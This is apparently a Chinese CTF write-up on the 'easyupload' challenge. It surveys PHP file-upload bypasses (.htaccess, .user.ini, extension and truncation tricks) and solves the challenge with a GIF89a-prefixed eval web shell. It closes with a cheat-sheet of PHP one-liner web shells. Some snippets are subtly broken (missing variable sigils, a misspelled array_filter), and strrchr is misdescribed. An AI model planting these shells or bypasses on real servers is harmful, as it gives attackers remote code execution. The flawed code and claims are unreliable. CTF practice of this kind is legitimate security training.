# 题目：easyupload

[![p9BFZ6O.md.png](https://s1.ax1x.com/2023/05/09/p9BFZ6O.md.png)](https://imgse.com/i/p9BFZ6O)

[![p9BFa7j.md.png](https://s1.ax1x.com/2023/05/09/p9BFa7j.md.png)](https://imgse.com/i/p9BFa7j)

打开网页，发现是文件上传的问题，大致思路可以确定：绕过对文件的检测，再执行我们的木马文件获取信息；

## 文件上传漏洞总结

+ 基础文件上传漏洞

  - PHP文件上传通常使用`move_upload_file`配合`$_FILES`变量实现；

    `move_upload_file(file, newloc)`：`file`为需要移动的文件（需要是`$_FILES`类型），`newloc`为文件存储的位置；

  - 当PHP代码没有对提交的`$_FILES`进行限制时，可以上传恶意PHP脚本文件；

+ 00截断

  - 00截断绕过上传限制适用的场景为：后端先获取用户上传文件的文件名，如`test.php\00.jpg`，再根据文件名获得文件的实际后缀`jpg`；通过后缀的白名单校验后，最终在保存文件时发生截断，实现上传的文件为`test.php`；**实际PHP使用`$_FILES`实现文件上传时并不存在00截断绕过上传限制问题**，因为PHP在注册`$_FILES`全局变量时已经产生了截断。上传文件名为`test.php\00.jpg`的文件，而注册到`$_FILES['name']`的变量值为`test.php`，根据该值得到的后缀为`php`，因此无法通过后缀的白名单校验；

+ 转化字符集造成的截断

  - PHP在实现字符集转化时通常使用`iconv()`函数

    `iconv(fencode, tencode, str)`：将`str`按照`fencode`编码解释后，转化为`tencode`编码格式并返回；

  - UTF-8在单字节时允许的字符范围（十六进制）为`0x00~0x7F`，如果字符的十六进制不在范围内，则会从该字符处截断直接返回；

    PHP版本低于5.4时会产生上述问题，`version>5.4`则返回`false`；

  + 转换字符集造成的截断在绕过上传限制中适用的场景为，先在后端获取上传的文件后缀，经过后缀**白名单**判断后，如果有对文件名进行字符集转换操作，那么可能出现安全问题；例如如下后端检测

    `strrchr(str, char)`：在`str`字符串中查找第一个出现`char`字符的位置，并返回从`char`开始（包括 `char`）到结尾的子字符串；

    [![p9B2Ac4.md.png](https://s1.ax1x.com/2023/05/09/p9B2Ac4.md.png)](https://imgse.com/i/p9B2Ac4)

    我们可以通过上传文件名`test.php\x99.jpg`，后端处理后的`$ext=php\x99.jpg`，白名单可以通过，在处理`iconv()`函数时发生异常`$name='test.php\x99.jpg'`，产生截断，最终上传的文件名为`test.php`；

+ 文件后缀黑名单绕过

  + 黑名单校验是创建一个黑名单列表，判断文件后缀名是否存在于黑名单内，实现过滤；

  + PHP常见的可执行后缀名

  ```
  php
  php3
  phtml
  pht
  #大小写绕过
  环境为Windows可以尝试
  php
  php: :$DATA
  php.
  ```

  ​	可以采用重命名后缀的方式绕过；

  - 当重命名失效时，黑名单中没有`.htaccess .user.ini`，可以通过上传`.htaccess .user.ini`配置文件实现绕过；

    * `.htaccess`：是Apache分布式配置文件的默认名称，`.htaccess`文件可以覆盖主配置文件的指令；

       通过上传`.htaccess`文件配置`Files`用PHP解析其他类型的文件，文件内容如下：

      ```
      <Files "test.jpg">
      	SetHandler application/x-httpd-php
      </Files>
      ```

    * `.user.ini`：PHP文件执行时，除了加载`php.ini`还会扫描其他的INI文件，可以通过插入`.user.ini`文件来更改解析规则；

      上传`.user.ini`文件的内容如下：

      ```
      auto_prepend_file=test.jpg
      ```

      `auto_prepend_file`：指定一个文件，在主文件解析前解析它；

      不过`.user.ini`也存在很大的局限性，只有在当前目录下有PHP文件被执行时，才会加载`.user.ini`文件，但是上传目录通常不会有PHP文件（需要我们伪造）；

+ 文件后缀白名单绕过

  - 白名单检测通常比黑名单更为安全

  - Nginx解析漏洞：先上传`test.jpg`文件，再访问`test.jpg/1.php`，由于`1.php`本身不存在，则会去掉`\`及后续内容，继续判断`test.jpg`是否存在，若存在会按照PHP解析该文件，从而实现木马注入；
  - 多后缀名绕过：在Apache中支持单个文件有多个后缀，解析过程是从最右边开始识别，如果后缀不存在对应的解析程序则会继续往后识别。先上传`test.php.jpg`文件再重命名为`test.php.xxx`，由于无法解析`.xxx`后缀名，那么就会继续识别`.php`，从而实现执行PHP代码；

## 解题过程

+ 我们先构造一个`test.gif`文件试上传，内容为：

  ```
  <?php eval($_POST['cmd']);?>
  ```

  [![p9BfqVs.md.png](https://s1.ax1x.com/2023/05/09/p9BfqVs.md.png)](https://imgse.com/i/p9BfqVs)

  [![p9BfvGV.md.png](https://s1.ax1x.com/2023/05/09/p9BfvGV.md.png)](https://imgse.com/i/p9BfvGV)

  修改为`php`后缀也无法上传成功，都提示文件有点奇怪，说明可能是既检测了后缀名，也检测了文件的内容；

  尝试使用PHP其他后缀名后发现均被过滤了，说明不能通过后缀名来上传木马文件；

+ 可能后端对是否是图片文件也进行了内容检测，我们需要在木马中加上`GIF89a`文件头，绕过文件内容检测；

  [![p9BhgQU.md.png](https://s1.ax1x.com/2023/05/09/p9BhgQU.md.png)](https://imgse.com/i/p9BhgQU)

  发现依然被拒绝了，说明不仅仅检测了文件头内容，还过滤了字符串`php`；

  修改上传内容为：

  ```
  GIF89a
  <?= eval($_POST['cmd']);?>
  ```

  发现上传成功且路径为：`uploads/test.gif`；

  [![p9BIqyT.md.png](https://s1.ax1x.com/2023/05/09/p9BIqyT.md.png)](https://imgse.com/i/p9BIqyT)

+ 综上分析，我们可以通过手动添加文件头+一句话木马上传恶意脚本，但是却无法直接执行，因为当我们访问`test.gif`时服务器不会将它当做PHP文件解析；

  - 尝试上传`.htaccess`文件肯定是不行的，因为它的文件内容如下：

    ```
    GIF89a
    <Files "test.gif">
    	SetHandler application/x-httpd-php
    </Files>
    ```

    一定包含了`php`字符串，会被过滤掉；

  - 尝试上传`.user.ini`文件，文件内容如下：

    ```
    GIF89a
    auto_prepend_file=test.gif
    ```

    [![p9Boekd.md.png](https://s1.ax1x.com/2023/05/09/p9Boekd.md.png)](https://imgse.com/i/p9Boekd)

    上传成功，但是`.user.ini`被加载的条件是当前目录下有PHP文件；

    浏览器界面按F12，观看数据包传递信息，发现uploads/index.php，正好有一个PHP文件，使用蚁剑连接工具，获取目录；

    [![p9Bo6AJ.md.png](https://s1.ax1x.com/2023/05/09/p9Bo6AJ.md.png)](https://imgse.com/i/p9Bo6AJ)

    [![p9BTAg0.md.png](https://s1.ax1x.com/2023/05/09/p9BTAg0.md.png)](https://imgse.com/i/p9BTAg0)

    在根目录下找到flag文件；

    [![p9BTJKK.md.png](https://s1.ax1x.com/2023/05/09/p9BTJKK.md.png)](https://imgse.com/i/p9BTJKK)

### 一句话木马总结

+ 首先使用`<?php phpinfo();?>`进行测试，如果能成功上传说明没有对字符串`php`进行过滤；

+ 如果无法上传说明对`php`字符串进行了过滤，绕过方式如下：

  ```php
  <?=eval($_POST['cmd']);?>
  ```

  `<?= ?>`：`=`表示`php echo`，实际上的php代码是：

  ```
  <?php echo eval($_POST['cmd']);?>
  ```

如果其他字符串被过滤，可以采用以下一句话木马尝试：

```php
<?php eval($_POST[cmd]) ?>

<?php @eval($_POST['cmd']);?>

<?php assert($_REQUEST["a"]); ?>

<?php func=create_function('',$_POST['a']); func();?>

<?php
    $func = $_POST['a'];
    $arr = array($_POST['b']);
    news = array_map($func, $arr);
?>

<?php call_user_func(assert,$_GET['a']);?>

<?php $arr = array_filert($_GET['func'],array($_GET['a']));?>

<?php $_GET['func']($_GET['a']);?>
    
#$_REQUEST, $_GET, $_POST均可尝试
#当‘php’被过滤时，使用'<?= ?>'，需要调整对应的代码
```